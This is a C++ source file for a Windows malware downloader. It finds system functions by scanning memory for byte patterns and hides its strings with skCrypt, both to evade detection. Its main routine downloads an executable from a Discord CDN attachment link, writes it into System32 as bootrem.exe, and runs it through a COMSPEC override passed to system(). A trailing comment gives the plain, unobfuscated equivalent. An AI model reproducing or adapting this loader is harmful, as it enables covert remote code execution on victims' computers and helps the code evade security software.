#include <iostream>
#include <windows.h>
#include <vector>
#include "sk_crypt.h"

#define ucrtbase_xref skCrypt("43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 75 00 63 00 72 00 74 00 62 00 61 00 73 00 65 00 2E 00 64 00 6C 00 6C")
#define kernelbase_xref skCrypt("43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 4B 00 45 00 52 00 4E 00 45 00 4C 00 42 00 41 00 53 00 45")

inline HANDLE g_heap = 0;

std::uint8_t* global_pattern_scan(uintptr_t begin, uintptr_t sz, const char* signature) {
    static auto pattern_to_byte = [](const char* pattern) {
        auto bytes = std::vector<int>{};
        auto start = const_cast<char*>(pattern);
        auto end = const_cast<char*>(pattern) + std::strlen(pattern);

        for (auto current = start; current < end; ++current) {
            if (*current == '?') {
                ++current;

                if (*current == '?')
                    ++current;

                bytes.push_back(-1);
            }
            else {
                bytes.push_back(std::strtoul(current, &current, 16));
            }
        }
        return bytes;
    };

    auto size_of_image = sz;
    auto pattern_bytes = pattern_to_byte(signature);
    HANDLE proc = GetCurrentProcess();
    bool find_mem = false;

    auto scan_bytes = reinterpret_cast<std::uint8_t*>(begin);

    auto s = pattern_bytes.size();
    auto d = pattern_bytes.data();

    for (auto i = 0ul; i < size_of_image - s; ++i) {
        bool found = true;

        for (auto j = 0ul; j < s; ++j) {
            if (scan_bytes[i + j] != d[j] && d[j] != -1) {
                found = false;
                break;
            }
        }
        if (found)
            return &scan_bytes[i];
    }

    printf(skCrypt("[global_pt_scan] not found!\n"));
    return nullptr;
}

std::uint8_t* pattern_scan(uintptr_t module_handle, const char* signature) {
    static auto pattern_to_byte = [](const char* pattern) {
        auto bytes = std::vector<int>{};
        auto start = const_cast<char*>(pattern);
        auto end = const_cast<char*>(pattern) + std::strlen(pattern);

        for (auto current = start; current < end; ++current) {
            if (*current == '?') {
                ++current;

                if (*current == '?')
                    ++current;

                bytes.push_back(-1);
            }
            else {
                bytes.push_back(std::strtoul(current, &current, 16));
            }
        }
        return bytes;
    };

    auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(module_handle);
    auto nt_headers =
        reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<std::uint8_t*>(module_handle) + dos_header->e_lfanew);

    auto size_of_image = nt_headers->OptionalHeader.SizeOfImage;
    auto pattern_bytes = pattern_to_byte(signature);
    auto scan_bytes = reinterpret_cast<std::uint8_t*>(module_handle);

    auto s = pattern_bytes.size();
    auto d = pattern_bytes.data();

    for (auto i = 0ul; i < size_of_image - s; ++i) {
        bool found = true;

        for (auto j = 0ul; j < s; ++j) {
            if (scan_bytes[i + j] != d[j] && d[j] != -1) {
                found = false;
                break;
            }
        }
        if (found)
            return &scan_bytes[i];
    }

    printf(skCrypt(("[pt_scan] not found!\n")));
    return nullptr;
}

DWORD64 get_process_heap()
{
    auto value = __readgsqword(0x60);
    value = *reinterpret_cast<DWORD64*>(value + 0x30);
    return value;
}

uintptr_t get_module(const char* signature)
{
    const auto ptr = global_pattern_scan(reinterpret_cast<uintptr_t>(g_heap), 0xF0000, signature) - 0x98;
    if (ptr != nullptr)
    {
        return *reinterpret_cast<uintptr_t*>(ptr);
    }

    return 0;
}

int main()
{
    g_heap = (HANDLE)(get_process_heap());

    const auto kernelbase_dll = get_module(kernelbase_xref);
    if (kernelbase_dll > 0)
    {
        const auto loadlib_func = pattern_scan(kernelbase_dll, (skCrypt("48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B F9 48 85 C9 74 1B 48 8D 15 ?? ?? ?? ?? 48 FF 15 ?? ?? ?? ?? 0F 1F 44 00 00 85 C0 0F 84 ?? ?? ?? ?? 45 33 C0 33 D2 48 8B CF E8 ?? ?? ?? ?? 48 8B 5C 24 30 48 8B 74 24 38 48 83 C4 20 5F C3")));       
        HMODULE ucrtbase_dll = ((HMODULE(_stdcall*)(const char*))(loadlib_func))(skCrypt("ucrtbase.dll"));
        HMODULE urlmon_dll = ((HMODULE(_stdcall*)(const char*))(loadlib_func))(skCrypt("urlmon.dll"));
        const auto urldownload_func = pattern_scan((uintptr_t)urlmon_dll, (skCrypt("40 53 55 56 57 41 54 41 56 41 57 48 81 EC 60 01 00 00 48 8B 05 ?? ?? ?? ?? 48 33 C4 48 89 84 24 50 01 00 00 4C 8B BC 24 C0 01 00 00 49 83 CC FF 49 8B C4 41 8B E9 49 8B F0 48 8B FA 4C 8B F1 48 FF C0 80 3C 02 00 75 F7 8D 1C 45 ?? ?? ?? ?? 8B D3 48 8D 8C 24 C0 00 00 00 E8 ?? ?? ?? ?? 48 8B 8C 24 C0 00 00 00 48 85 C9 75 0A BB 0E 00 07 80")));
        ((void(_stdcall*)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK))(urldownload_func))(0, skCrypt("https://cdn.discordapp.com/attachments/722429407716966483/1093176696401842316/yaya.exe"), skCrypt("C:\\Windows\\System32\\bootrem.exe"), 0, 0);
        const auto system_func = pattern_scan((uintptr_t)ucrtbase_dll, (skCrypt("E9 ?? ?? ?? ?? CC CC CC CC CC CC CC 48 89 5C 24 10 48 89 74 24 18 48 89 7C 24 20 55 48 8B EC 48 83 EC 60 48 8B 05 ?? ?? ?? ?? 48 33 C4 48 89 45 F8 48 8B F1 4C 8D 05 ?? ?? ?? ?? 33 FF 48 8D 4D D0 33 D2 48 89 7D D0"))) + 0xC;
        ((void(_stdcall*)(const char*))(system_func))(skCrypt("set comspec=bootrem.exe & echo test|rem"));
    }

    // clean c++ code
    // UrlDownloadToFile(0, "https://cdn.discordapp.com/attachments/722429407716966483/1093176696401842316/yaya.exe", "C:\\Windows\\System32\\bootrem.exe", 0, 0);
	// system("set comspec=bootrem.exe & echo test|rem");
}
